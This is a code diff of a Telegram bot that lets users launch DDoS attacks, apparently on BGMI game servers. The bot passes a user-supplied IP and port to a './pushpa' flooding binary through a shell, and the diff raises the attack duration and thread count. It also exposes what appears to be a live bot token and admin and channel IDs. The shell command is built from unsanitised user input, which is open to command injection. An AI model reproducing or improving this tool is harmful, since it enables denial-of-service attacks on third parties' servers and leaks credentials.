@@ -10,7 +10,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 # Telegram bot token and channel ID
-TOKEN = '7581868845:AAEJx6Im3cqQyIjbwXNei41c7lpeqXbCnBM'  # Replace with your actual bot token
+TOKEN = '7581868845:AAESvNqIdDkU2nc7DiUIdAcfkjjO0A5Q5PU'  # Replace with your actual bot token
 ADMIN_IDS = [7479349647]  # Added new admin ID
 CHANNEL_ID = '-1002439558968'  # Replace with your specific channel or group ID
 # Initialize the bot
@@ -315,7 +315,7 @@ def bgmi_command(message):
             user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
 
         # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
-        default_duration = 80
+        default_duration = 120
         
         remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
         
@@ -327,7 +327,7 @@ def bgmi_command(message):
         )
 
         # Log the attack started message
-        logging.info(f"Attack started by {user_name}: ./pushpa {target_ip} {target_port} {default_duration} ")
+        logging.info(f"Attack started by {user_name}: ./pushpa {target_ip} {target_port} {default_duration} 700")
 
         # Run the attack command with the default duration and pass the user-provided duration for the finish message
         asyncio.run(run_attack_command_async(target_ip, int(target_port), default_duration, user_duration, user_name))
@@ -337,7 +337,7 @@ def bgmi_command(message):
 
 async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
     try:
-        command = f" ./pushpa {target_ip} {target_port} {duration} 500"
+        command = f" ./pushpa {target_ip} {target_port} {duration} 700"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
         bot.send_message(CHANNEL_ID, f"‼️𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!‼️\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port} 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝙏𝙁_𝙁𝙇𝘼𝙎𝙃 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧")
